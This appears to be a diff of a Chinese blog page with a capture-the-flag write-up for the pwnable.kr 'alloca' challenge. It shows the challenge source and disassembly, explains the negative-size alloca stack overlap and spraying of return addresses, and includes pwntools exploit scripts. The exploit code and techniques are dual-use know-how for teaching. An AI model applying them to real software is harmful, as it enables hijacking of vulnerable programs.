@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../" aria-busy="true">
   <a href="../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../"
          data-navigation-hidden="false">
       
@@ -754,17 +754,34 @@
   
 
 
+<!-- blog-edit-start:4ed82e0c4974e9a1:b0 -->
+
 <h1 id="pwnablekr-alloca">pwnable.kr alloca详细分析</h1>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b0 -->
+
 <div class="file-actions" data-image-edit-revision="f056485d208c12047cb4f1d1334e5f6fad53c20a3b0ef569b7d8126ef6a422f8" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote%5C36.alloca.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cpwnable_kr%5Cnote" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\36.alloca.md">复制路径</span></div>
 
+<!-- blog-edit-start:4ed82e0c4974e9a1:b1 -->
+
 <p>主要是别人的一篇文章，我自己改了一些，加了一点自己做题遇到的问题。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b1 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b2 -->
+
 <blockquote>
 <p>转载说明<br />
 本文由Kir[A]原创发布\<br />
 出处： <a href="https://www.anquanke.com/post/id/170288">https://www.anquanke.com/post/id/170288</a>\<br />
 发布时间：2019-01-29 11:15:56</p>
 </blockquote>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b2 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b3 -->
+
 <h2 id="_1">源代码</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b3 -->
+<!-- blog-edit-start:4ed82e0c4974e9a1:b4 -->
+
 <p>题目提供了一个alloca二进制文件，以及程序的源码<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
@@ -814,11 +831,35 @@
 </span><span id="__span-0-46"><span class="linenos" data-linenos="46 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 </span><span id="__span-0-47"><span class="linenos" data-linenos="47 "></span><span class="p">}</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b4 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b5 -->
+
 <p>程序模仿 canary 的原理，使用 <code>alloca</code> 开辟栈空间后，在 <code>buffer</code> 后面加 4 字节的 <code>g_canary</code> ，同时在 <code>check_canary</code> 中检查栈中的 canary 是否被修改。程序里面也预留了一个 <code>callme</code> 的后门。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b5 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b6 -->
+
 <h2 id="alloca">alloca 函数</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b6 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b7 -->
+
 <p>先看一下本题关键函数 alloca 是什么东东。<code>alloca</code> 跟 <code>malloc/calloc/realloc</code> 类似，都是内存分配函数。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b7 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b8 -->
+
 <p><strong>但是它是在当前函数的栈帧上分配存储空间，而不是在堆中。当函数返回时会自动释放它所使用的栈帧，不必为释放空间而费心。</strong></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b8 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b9 -->
+
 <h2 id="_2">漏洞分析</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b9 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b10 -->
+
 <p>程序只开了 NX 保护。下面我们来在 IDA 看看伪源码。和给出的源码基本一致，但是有一处不太一样，代码如下。<br />
 <div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos=" 1 "></span><span class="kt">int</span><span class="w"> </span><span class="kr">__cdecl</span><span class="w"> </span><span class="n">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 </span><span id="__span-1-2"><span class="linenos" data-linenos=" 2 "></span><span class="p">{</span>
@@ -831,6 +872,10 @@
 </span><span id="__span-1-9"><span class="linenos" data-linenos=" 9 "></span><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
 </span><span id="__span-1-10"><span class="linenos" data-linenos="10 "></span><span class="p">}</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b10 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b11 -->
+
 <p>查看该处的汇编指令。<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos=" 1 "></span>v3 = alloca(16 * ((size + 34) / 0x10u));
 </span><span id="__span-2-2"><span class="linenos" data-linenos=" 2 "></span>.text:08048742                 add     esp, 10h
@@ -852,8 +897,16 @@
 </span><span id="__span-2-18"><span class="linenos" data-linenos="18 "></span>.text:08048773                 shl     eax, 4
 </span><span id="__span-2-19"><span class="linenos" data-linenos="19 "></span>.text:08048776                 mov     ds:buffer, eax
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b11 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b12 -->
+
 <p>可以看到这是 <code>alloca</code> 开辟栈空间时进行了对齐，重点要留意下对 <code>esp</code> 进行操作的代码。正常来说，这里分配栈空间的逻辑实现是没问题的，但是程序使用 <code>scanf("%d", &amp;size);</code> 读入 <code>size</code>。<br />
 <strong>如果我们输入的是一个负数呢？那么<code>esp</code>就会降低，分配的栈空间地址会与程序已使用的栈空间重合。</strong></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b12 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b13 -->
+
 <p>我们要如何利用这个漏洞呢，继续看一下 main 函数结尾部分的汇编<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos="1 "></span>.text:08048824                 call    check_canary
 </span><span id="__span-3-2"><span class="linenos" data-linenos="2 "></span>.text:08048829                 add     esp, 10h
@@ -863,6 +916,10 @@
 </span><span id="__span-3-6"><span class="linenos" data-linenos="6 "></span>.text:08048835                 lea     esp, [ecx-4]
 </span><span id="__span-3-7"><span class="linenos" data-linenos="7 "></span>.text:08048838                 retn
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b13 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b14 -->
+
 <p>可以看到程序 <code>ret</code> 前，<code>ecx-4</code> 的值赋给 <code>esp</code>，而 <code>ecx</code> 的值等于 <code>[ebp-4]</code>，那么只要我们能控制 <code>[ebp-4]</code>，就能控制程序流。<br />
 程序有三个输入点：</p>
 <ol>
@@ -870,10 +927,29 @@
 <li>输入 <code>g_canary</code> </li>
 <li>输入 <code>buff</code> 的内容</li>
 </ol>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b14 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b15 -->
+
 <p><strong>由于我们输入的 size 是负数，实际上 <code>fgets(buffer, size, stdin)</code> 是无法读入字符</strong></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b15 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b16 -->
+
 <p><strong>那么唯一可控的输入点只有 <code>g_canary</code>，那么目标很明确了，就是 <code>[ebp-4] = shell_pointer+4</code>，这样返回时 <code>ecx=shell_pointer+4, esp=shell_pointer</code>，所以 <code>esp--&gt;shell</code>，这样执行 <code>retq</code> 之后就成功转入 <code>shell</code>。</strong></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b16 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b17 -->
+
 <p>需要在程序里面找一下哪里有将 <code>g_canary</code> 写到栈中的操作。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b17 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b18 -->
+
 <h2 id="_3">失败的尝试一</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b18 -->
+<!-- blog-edit-start:4ed82e0c4974e9a1:b19 -->
+
 <p>首先想到的是 main 函数的赋值，即 <code>memcpy(buffer+size, &amp;g_canary, 4)</code>。<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos="1 "></span>.text:080487BE                 add     esp, 10h
 </span><span id="__span-4-2"><span class="linenos" data-linenos="2 "></span>.text:080487C1                 mov     eax, ds:buffer
@@ -882,10 +958,29 @@
 </span><span id="__span-4-5"><span class="linenos" data-linenos="5 "></span>.text:080487CE                 mov     eax, ds:g_canary
 </span><span id="__span-4-6"><span class="linenos" data-linenos="6 "></span>.text:080487D3                 mov     [edx], eax
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b19 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b20 -->
+
 <p>肯定是想法设法让 <code>buffer+size</code> 指向 <code>ebp-4</code>，但是最后我发现无论怎么样都会失败，即使 <code>size</code> 为负数，虽然这样可以让 <code>buffer</code> 指向 <code>ebp</code> 附件的位置，但是只要加上 <code>size</code> 就会回到正常位置。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b20 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b21 -->
+
 <p><strong>经过思考，发现原因： <code>buffer</code> 是通过 <code>buffer = alloca( size + 4 );</code> 得来的，然后通过 <code>memcpy(buffer+size, &amp;g_canary, 4)</code>，这不就又回去了吗！相当于减去一个 <code>size</code>，然后又加上了一个 <code>size</code>。</strong></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b21 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b22 -->
+
 <p>所以无论如何 <code>buffer+size</code> 始终会是正常的位置，不可能是 <code>ebp-4</code>！</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b22 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b23 -->
+
 <h2 id="_4">成功的尝试二</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b23 -->
+<!-- blog-edit-start:4ed82e0c4974e9a1:b24 -->
+
 <p>然后就是本篇转载的文章了，不知道是怎么想到的，它想到了是 <code>check_canary</code> 函数的赋值<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos=" 1 "></span>.text:080485E1     check_canary    proc near               
 </span><span id="__span-5-2"><span class="linenos" data-linenos=" 2 "></span>.text:080485E1 000                 push    ebp      
@@ -899,9 +994,24 @@
 </span><span id="__span-5-10"><span class="linenos" data-linenos="10 "></span>.text:080485F8 01C                 mov     eax, ds:g_canary
 </span><span id="__span-5-11"><span class="linenos" data-linenos="11 "></span>.text:080485FD 01C                 mov     [ebp-0x14], eax 
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b24 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b25 -->
+
 <p>最后一行这里有一个将 <code>g_canary</code> 写到栈中的操作，现在如何计算输入的 size 是本题解题的关键所在。这里有两种方式，第一种是转载文章的手工计算，第二种是我自己写的暴力计算。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b25 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b26 -->
+
 <h3 id="_5">手工计算</h3>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b26 -->
+<!-- blog-edit-start:4ed82e0c4974e9a1:b27 -->
+
 <p>我们从这里根据 <code>esp</code> 和 <code>ebp</code> 的值开始反推出 <code>size</code> 的值。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b27 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b28 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos=" 1 "></span>.text:080485E1     check_canary    proc near               
 </span><span id="__span-6-2"><span class="linenos" data-linenos=" 2 "></span>.text:080485E1 000                 push    ebp      
 </span><span id="__span-6-3"><span class="linenos" data-linenos=" 3 "></span>.text:080485E2 004                 mov     ebp, esp
@@ -914,6 +1024,10 @@
 </span><span id="__span-6-10"><span class="linenos" data-linenos="10 "></span>.text:080485F8 01C                 mov     eax, ds:g_canary
 </span><span id="__span-6-11"><span class="linenos" data-linenos="11 "></span>.text:080485FD 01C                 mov     [ebp-0x14], eax 
 </span></code></pre></div>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b28 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b29 -->
+
 <ol>
 <li>根据 0x80485FD 赋值的代码，有此时 <code>[ebp-0x14] = g_canary</code></li>
 <li>根据 0x80485E2 的 <code>mov ebp, esp</code>，那么有此时 <code>[esp-0x14] = g_canary</code></li>
@@ -961,11 +1075,35 @@
 <ol>
 <li>计算可得，0x804866E 时，此时 <code>[ebp-size-86] = g_canary</code></li>
 </ol>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b29 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b30 -->
+
 <p>因为我们的目的是 <code>[ebp-4] = shell_pointer+4</code>，因此 <code>g_canary=shell_pointer+4</code> 且 <code>[ebp-4]=[ebp-size-86]</code>，所以得到 <code>size = -82</code>。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b30 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b31 -->
+
 <p>当然因为没有考虑对齐问题，其实 <code>size</code> 为 -67 到 -82 都可以，只要 <code>(size+34)/16=-3</code> 即可。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b31 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b32 -->
+
 <h3 id="_6">暴力求解</h3>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b32 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b33 -->
+
 <p>我的方法就很纯粹了，因为手工计算这个很有可能计算半天还是错的，这就太尴尬了。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b33 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b34 -->
+
 <p>我的方法是每次 gdb 调试这个程序，输入猜测的 size，因为在 gdb 中，所以可以得到 main 函数的 <code>ebp</code> 和 <code>g_canary</code> 写入的地址，然后比对一下他们是否一样。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b34 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b35 -->
+
 <p>当然肯定不是手动 gdb，写一个脚本，猜测的 size 值从小到大试就完事了，代码如下，这个是我在 pwnable.kr 它的网站上运行的，所以 gdb 的行为不一样(主要是大部分 gdb 输出彩色，它这个不输出彩色)，所以不是拿来就能用，需要自己去调整。<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-10-1"><span class="linenos" data-linenos=" 1 "></span><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
 </span><span id="__span-10-2"><span class="linenos" data-linenos=" 2 "></span>
@@ -1002,9 +1140,24 @@
 </span><span id="__span-10-33"><span class="linenos" data-linenos="33 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span><span id="__span-10-34"><span class="linenos" data-linenos="34 "></span><span class="nb">print</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b35 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b36 -->
+
 <h2 id="shell_pointer">SHELL_pointer</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b36 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b37 -->
+
 <p>现在的问题就是这个 shell_pointer 在哪？这个 shell 我们已经找到了，就是 <code>callme</code> 后门，那么哪块内存里面存着 <code>callme</code> 的地址呢？这就需要用到 Spray 的思想，tiny_easy 那道题也是这样。利用环境变量或者参数变量写入大量的 <code>callme</code> 地址即可。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b37 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b38 -->
+
 <h2 id="exp">完整 exp</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b38 -->
+<!-- blog-edit-start:4ed82e0c4974e9a1:b39 -->
+
 <p>利用环境变量，这个是别人的。他这个需要每次交互才行，不太好。<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-11-1"><span class="linenos" data-linenos=" 1 "></span><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
 </span><span id="__span-11-2"><span class="linenos" data-linenos=" 2 "></span><span class="n">callme</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080485ab</span><span class="p">)</span>
@@ -1019,6 +1172,10 @@
 </span><span id="__span-11-11"><span class="linenos" data-linenos="11 "></span>    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
 </span><span id="__span-11-12"><span class="linenos" data-linenos="12 "></span>            <span class="k">continue</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b39 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b40 -->
+
 <p>利用参数变量，这个是我自己写的。我这个就可以直接挂在那里让他跑就完事了。<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><span class="linenos" data-linenos=" 1 "></span><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
 </span><span id="__span-12-2"><span class="linenos" data-linenos=" 2 "></span><span class="n">_argv</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;./alloca&#39;</span><span class="p">]</span>
@@ -1045,13 +1202,27 @@
 </span><span id="__span-12-23"><span class="linenos" data-linenos="23 "></span>       <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span><span id="__span-12-24"><span class="linenos" data-linenos="24 "></span>       <span class="k">continue</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b40 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b41 -->
+
 <p>由于 stack 空间地址随机，需要多试几次才能成功。</p>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b41 -->
+
+<!-- blog-edit-start:4ed82e0c4974e9a1:b42 -->
+
 <h2 id="_7">总结</h2>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b42 -->
+<!-- blog-edit-start:4ed82e0c4974e9a1:b43 -->
+
 <ul>
 <li>输入一定要考虑输负数会发生什么</li>
 <li>对于每个函数，必须要看它的汇编代码，看看它是如何返回的，有些利用了 <code>ecx</code> 这些寄存器，就有可能有漏洞</li>
 <li>Spray 思想要想到</li>
 </ul>
+<!-- blog-edit-end:4ed82e0c4974e9a1:b43 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\pwnable_kr\note\36.alloca.md" data-text-edit-revision="f056485d208c12047cb4f1d1334e5f6fad53c20a3b0ef569b7d8126ef6a422f8" data-text-edit-marker="4ed82e0c4974e9a1" data-text-edit-schema="1"></div>
 
 
 
@@ -1283,8 +1454,6 @@
         <script src="../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
